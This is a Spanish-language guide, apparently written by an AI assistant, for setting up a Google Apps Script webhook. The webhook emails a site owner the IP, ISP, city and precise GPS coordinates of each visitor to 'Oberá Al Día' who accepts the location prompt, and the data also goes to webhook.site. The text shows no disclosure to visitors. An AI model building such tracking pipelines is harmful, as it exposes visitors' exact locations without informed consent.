# 📧 GUÍA: Recibir Ubicaciones por Gmail

## 🎯 Con Esta Configuración Recibirás

**Cada vez que alguien acepta GPS, te llega un email así:**

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📍 NUEVA UBICACIÓN GPS
Oberá Al Día
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Fecha: 04/03/2026 16:45:22

🌐 INFORMACIÓN DE RED:
IP: 181.45.123.45
ISP: Telecom Argentina S.A.
Ciudad: Oberá
Región: Misiones

✅ GPS ACEPTADO:
Latitud: -27.4912345
Longitud: -55.1183678
Precisión: 18.5 metros

🗺️ Ver en Google Maps (click):
https://maps.google.com/?q=-27.4912345,-55.1183678
```

---

## 📋 Configuración en 5 Pasos

### 1️⃣ Ir a Google Apps Script

Ve a: **https://script.google.com**

### 2️⃣ Crear Proyecto

1. Click **"Nuevo proyecto"**
2. **Borra** todo el código por defecto
3. **Copia y pega** el código del archivo `email-notification-script.gs`

### 3️⃣ Configurar Tu Email

En la **línea 10**, cambia:
```javascript
emailDestino: 'TU_EMAIL@gmail.com',
```

Por TU email:
```javascript
emailDestino: 'axel@gmail.com', // TU EMAIL REAL
```

**Guarda:** Click en 💾

---

### 4️⃣ Probar

1. Menú desplegable arriba: Selecciona **`testEmail`**
2. Click **Ejecutar** (▶️)
3. Te pedirá permisos: **Permitir todo**
4. **Revisa Gmail** → Debería llegar email de prueba

---

### 5️⃣ Obtener URL del Webhook

1. Click **"Implementar"** → **"Nueva implementación"**
2. Click ícono ⚙️ → **"Aplicación web"**
3. Configurar:
   - Ejecutar como: **Yo**
   - Acceso: **Cualquier persona**
4. Click **"Implementar"**
5. **COPIAR LA URL** que termina en `/exec`

---

## ⚙️ Configurar en analytics.js

Pégame la URL de Google Script y yo actualizo el archivo, o:

**GitHub:**
https://github.com/AxelBytes/obera-al-dia/blob/main/analytics.js

Línea 15:
```javascript
googleScriptUrl: 'https://script.google.com/macros/s/AKfycbx.../exec',
```

---

## ✅ Listo

Cada vez que alguien acepta GPS:
- ✅ Ves en webhook.site
- ✅ Te llega EMAIL a tu Gmail

**¿Ya creaste el script? ¿Tienes la URL?** Pásame la URL y actualizo analytics.js 📧

